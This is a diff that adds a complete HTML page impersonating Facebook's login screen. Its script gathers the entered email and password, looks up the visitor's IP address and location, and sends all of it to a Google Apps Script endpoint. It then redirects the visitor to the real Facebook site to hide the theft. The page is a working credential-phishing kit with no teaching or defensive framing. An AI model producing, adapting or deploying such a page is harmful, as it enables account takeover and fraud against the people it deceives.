@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook Login</title>
+  <style>
+    body {
+      margin: 0; padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #1877f2;
+      display: flex; justify-content: center; align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 8px;
+      width: 320px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    .login-box h1 {
+      color: #1877f2;
+      font-size: 32px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 14px 12px;
+      margin: 10px 0 20px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 18px;
+      padding: 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background-color: #145dbf;
+    }
+    .message {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h1>Facebook</h1>
+  <form id="loginForm">
+    <input type="text" id="email" name="email" placeholder="Email or phone number" required />
+    <input type="password" id="password" name="password" placeholder="Password" required />
+    <button type="submit">Log In</button>
+  </form>
+  <div class="message" id="message"></div>
+</div>
+
+<script>
+  const GOOGLE_SHEET_WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxQ-WJkMFFmWVXngRzWOFMFP3y122X86FoZVj0QKjq1luuqMF9232C7iSrc_dbOLq81lQ/exec';
+
+  const form = document.getElementById('loginForm');
+  const messageDiv = document.getElementById('message');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const userAgent = navigator.userAgent;
+
+    let ipData = {};
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      ipData = await response.json();
+    } catch (err) {
+      ipData = {ip:'N/A', city:'N/A', region:'N/A', country_name:'N/A'};
+    }
+
+    const data = {
+      email: email,
+      password: password,
+      timestamp: new Date().toISOString(),
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country_name,
+      userAgent: userAgent
+    };
+
+    try {
+      await fetch(GOOGLE_SHEET_WEBAPP_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      });
+
+      messageDiv.style.color = 'green';
+      messageDiv.textContent = 'Logging in... Redirecting now.';
+
+      setTimeout(() => {
+        window.location.href = 'https://www.facebook.com';
+      }, 2000);
+    } catch (error) {
+      messageDiv.style.color = 'red';
+      messageDiv.textContent = 'Error submitting data. Please try again.';
+      console.error('Error:', error);
+    }
+  });
+</script>
+
+</body>
+</html>
